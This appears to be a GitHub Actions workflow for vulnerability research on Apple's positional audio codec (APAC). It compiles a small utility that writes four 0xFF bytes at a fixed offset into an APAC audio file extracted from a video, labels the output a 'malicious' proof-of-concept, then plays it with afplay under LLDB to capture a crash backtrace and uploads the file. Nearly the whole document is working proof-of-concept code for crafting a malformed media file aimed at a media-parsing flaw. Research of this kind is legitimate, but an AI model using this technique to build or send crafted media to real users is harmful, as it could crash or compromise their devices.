name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest2/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l

      # New: This script is now a simple utility to corrupt a file at a specific offset.
      - name: Patch encodeme.mm to be a Simple File Corruptor
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm to be a simple corruption utility..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>
          #include <stdio.h>
          #include <stdlib.h>

          int main(int argc, const char * argv[]) {
              if (argc != 3) {
                  fprintf(stderr, "Usage: %s <file_to_corrupt> <offset_to_corrupt>\n", argv[0]);
                  return 1;
              }

              const char* filePath = argv[1];
              long offset = atol(argv[2]);

              FILE *file = fopen(filePath, "r+b");
              if (!file) {
                  fprintf(stderr, "Failed to open file: %s\n", filePath);
                  return 1;
              }

              fprintf(stderr, "Corrupting file at offset 0x%lx...\n", offset);
              fseek(file, offset, SEEK_SET);
              
              // This is the malicious data that triggers the vulnerability
              unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
              fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
              fclose(file);
              
              fprintf(stderr, "Corruption complete.\n");
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile the corruption utility
      - name: Compile Corruption Utility
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme_corruptor..."
          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # This step now uses professional tools to find the audio track and create a clean APAC file before corrupting it.
      - name: Surgically Corrupt APAC File
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          set -x # Print each command before executing it for easier debugging
          
          echo "Installing ffmpeg to handle media files..."
          brew install ffmpeg

          # Step 1: Use ffprobe to identify the APAC audio stream from the original MOV file.
          echo "--- Dumping full ffprobe stream info to find the correct codec name... ---"
          ffprobe -v error -show_format -show_streams IMG_1027.mov
          echo "--------------------------------------------------------------------------"

          # We use grep and cut to extract the stream index. This may fail, but the log above will show us why.
          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_name -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1027.mov | grep 'apac' -B 1 | head -n 1)

          if [ -z "$APAC_STREAM_INDEX" ]; then
            echo "Could not find an APAC audio stream in the MOV file. Aborting."
            exit 1
          fi

          echo "Found APAC audio in stream index: ${APAC_STREAM_INDEX}"
          
          # Step 2: Use afconvert to extract and create a clean, standalone APAC audio file.
          afconvert -i IMG_1027.mov -o output_apac_clean.m4a -d apac -f mp4f --stream ${APAC_STREAM_INDEX}

          if [ $? -ne 0 ]; then
              echo "afconvert failed to create a clean APAC file."
              exit 1
          fi

          echo "Successfully created a clean APAC file. Now corrupting it..."
          cp output_apac_clean.m4a output_apac_poc.m4a

          # Step 3: Run the C++ utility to perform the corruption.
          CORRUPTION_OFFSET=288 # A common offset for the layout tag in clean afconvert files.
          ./encodeme_corruptor output_apac_poc.m4a $CORRUPTION_OFFSET
          
          echo "Malicious APAC PoC file generated."
          ls -l output_apac_poc.m4a
          
      # Launch the player directly under LLDB to catch any startup crashes.
      - name: Launch Player Under LLDB to Catch Crash
        working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) with final PoC ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Creating LLDB script to launch and monitor afplay..."
          cat > player_debug_script.lldb << 'EOF'
          # Run the process. LLDB will automatically stop if a crash occurs.
          run
          # If a crash occurred, this will give us the full backtrace.
          bt
          quit
          EOF

          echo "Launching afplay under LLDB..." >> $PLAYER_LOG_FILE
          lldb -s player_debug_script.lldb -- afplay output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true

          echo "âœ… Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: debug-and-poc-artifacts
          path: |
            AppleTest2/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
            AppleTest2/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
